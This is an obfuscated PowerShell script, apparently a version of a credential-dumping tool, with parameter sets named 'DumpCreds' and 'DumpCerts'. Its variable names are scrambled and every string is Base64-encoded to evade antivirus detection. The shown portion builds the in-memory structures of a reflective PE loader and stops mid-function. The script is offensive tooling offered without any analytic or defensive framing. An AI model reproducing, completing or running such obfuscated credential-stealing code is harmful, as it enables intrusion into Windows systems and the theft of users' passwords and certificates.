﻿function _/=====\/\/=======
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	${_/=\/\_____/\/==\_},
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    ${___/===\/\/\/==\/=},
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    ${____/\_/\/====\__/},
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    ${_/=\/\/===\_______}
)
Set-StrictMode -Version 2
${__/=\/=\_____/==\} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${_/===\__/=\/==\/\},
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		${___/=\____/=\/===},
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		${/=\/=\/\/\__/==\_},
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        ${__/\/\/=\_/\______}
	)
	Function ___/\/=====\__/=\_
	{
		${_____/=\_____/\__/} = New-Object System.Object
		${_/====\/=\_/==\_/} = [AppDomain]::CurrentDomain
		${/=\__/==\__/\/=\_} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${_/=\_/\/\/=\__/==} = ${_/====\/=\_/==\_/}.DefineDynamicAssembly(${/=\__/==\__/\/=\_}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${___/\_/=\_____/==} = ${_/=\_/\/\/=\__/==}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${/=\/=\/==\/\_/===} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${_/====\/===\_/\__} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name MachineType -Value ${_/====\/===\_/\__}
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${__/\_/===\_/\/\__} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name MagicType -Value ${__/\_/===\_/\/\__}
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${_/\/\_/\_/==\/=\/} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${_/\/\_/\_/==\/=\/}
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${/=\/\__/===\/====} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${/=\/\__/===\/====}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 8)
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${_/\/==\/\/=\/\/==} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${_/\/==\/\/=\/\/==}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 20)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/=\/\/=======\__} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${_/=\/\/=======\__}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 240)
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/\_/===\_/\/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${_/\/\_/\_/==\/=\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${/=\/\__/===\/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
